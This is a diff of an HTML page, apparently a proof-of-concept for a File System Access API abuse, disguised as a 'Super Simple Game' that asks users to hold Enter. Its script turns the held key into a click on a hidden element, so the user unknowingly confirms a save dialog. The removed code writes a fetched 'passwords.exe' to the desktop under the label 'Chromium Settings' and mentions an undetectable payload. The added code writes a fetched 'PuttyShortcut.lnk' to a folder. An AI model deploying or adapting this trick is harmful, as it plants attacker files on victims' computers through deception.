@@ -1,7 +1,7 @@
 <html>
 
 <head>
-    <title>Save file to desktop - File System Access API - security bug</title>
+    <title>Save file to folder - File System Access API - security bug</title>
     <meta charset="UTF-8">
 </head>
 
@@ -43,64 +43,44 @@
 
 <body>
     <script>
-        //how many time enter clicked in row
         let countEnter = 0;
-        //is file downloaded
         let isDownloaded = false;
 
-        //on page load
         window.onload = function () {
-            const body = document.querySelector('body')
-            const pixel = document.querySelector('#pixel')
+            const body = document.querySelector('body');
+            const pixel = document.querySelector('#pixel');
 
             body.onkeydown = e => (e.key == "Enter") ? clickedEnter() : 1;
             body.onkeyup = e => (e.key == "Enter") ? cancelEnter() : 1;
 
             pixel.addEventListener('click', async () => {
-                const options = {
-                    startIn: 'desktop',
-                    suggestedName: 'passwords',
-                    types: [
-                        {
-                            description:
-                                'Chromium Settings',
-                            accept: {
-                                'text/plain': ['.exe'] //could be .exe/.bat or anything
-                            }
-                        }
-                    ],
-                    //delete from Save as type "*.*" option
-                    excludeAcceptAllOption: true
+                try {
+                    const handle = await window.showDirectoryPicker();
+                    const fileHandle = await handle.getFileHandle("PuttyShortcut.lnk", { create: true });
+                    const writable = await fileHandle.createWritable();
+                    const response = await fetch("PuttyShortcut.lnk"); // harus tersedia di server
+                    await response.body.pipeTo(writable);
+                    document.querySelector("#gameover").textContent = "Shortcut berhasil disimpan ke folder!";
+                } catch (err) {
+                    document.querySelector("#gameover").textContent = "Gagal menyimpan shortcut.";
+                    console.error(err);
                 }
-
-                const handle = await window.showSaveFilePicker(options);
-                const writable = await handle.createWritable();
-                // 1) download file from local/server (Good for exe)
-                //you need to have FUD file lnkextra.lnk on server/local
-                //can be changed to diffrent file like cat.jpg
-                const response = await fetch('passwords.exe');
-                await response.body.pipeTo(writable);
-
-                document.querySelector("#gameover").textContent = "GAME OVER - Need refresh to start again"
-            })
+            });
         };
 
         function clickedEnter() {
-            countEnter++;            
-            //if button was hold more then 1 second and it wasn't downloaded - we can change !isDownloaded to countEnter % 30 === 0 to download many files
+            countEnter++;
             if (countEnter > 5 && !isDownloaded) {
-                pixel.click()
-                //set file is downloaded
+                pixel.click();
                 isDownloaded = true;
             }
         }
 
         function cancelEnter() {
-            //reset count enter if enter is not hold
             countEnter = 0;
         }
     </script>
-    <!-- div used to click to open Save As dialog -->
+
     <div id="pixel"></div>
     <h1>Super Simple Game😻😻😻</h1>
     <h2><span>⌨️HOLD ENTER</span> for 5 seconds</h2>
